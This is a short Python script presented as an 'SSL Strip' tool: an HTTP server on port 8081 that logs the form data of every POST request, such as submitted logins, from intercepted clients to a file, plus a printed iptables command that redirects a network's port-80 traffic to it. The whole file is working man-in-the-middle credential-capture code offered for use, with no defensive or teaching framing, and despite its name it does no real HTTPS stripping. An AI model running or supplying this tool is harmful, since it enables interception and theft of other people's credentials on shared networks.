from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
import datetime

LOG_FILE = "sslstrip_intercepted_log.txt"

class StripHandler(BaseHTTPRequestHandler):
    def handle_all_methods(self):
        method = self.command
        path = self.path
        client_ip = self.client_address[0]
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        if method == "POST":
            try:
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length).decode(errors='ignore')
                parsed_data = parse_qs(post_data)

                print(f"[+] {method} from {client_ip} → {path}")
                print(f"    Data: {parsed_data}")

                with open(LOG_FILE, "a") as f:
                    f.write(f"[{timestamp}] {client_ip} {method} → {path}\n")
                    for k, v in parsed_data.items():
                        f.write(f"    {k}: {v[0] if v else ''}\n")
                    f.write("-" * 50 + "\n")

            except Exception as e:
                print(f"[!] Error processing POST: {e}")

        else:
            print(f"[+] {method} → {path} from {client_ip}")

        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(f"<h3>{method} received at {path}</h3>".encode())

    # Override ALL HTTP methods
    def do_GET(self): self.handle_all_methods()
    def do_POST(self): self.handle_all_methods()
    def do_HEAD(self): self.handle_all_methods()
    def do_PUT(self): self.handle_all_methods()
    def do_DELETE(self): self.handle_all_methods()
    def do_OPTIONS(self): self.handle_all_methods()
    def do_PATCH(self): self.handle_all_methods()
    def do_CONNECT(self): self.handle_all_methods()
    def log_message(self, format, *args): return  # suppress default logs

def start_ssl_strip():
    port = 8081
    print(f"[*] SSL Strip started on port {port}")
    print(f"[!] Run iptables redirect: sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {port}")
    server = HTTPServer(("0.0.0.0", port), StripHandler)
    server.serve_forever()

if __name__ == "__main__":
    start_ssl_strip()
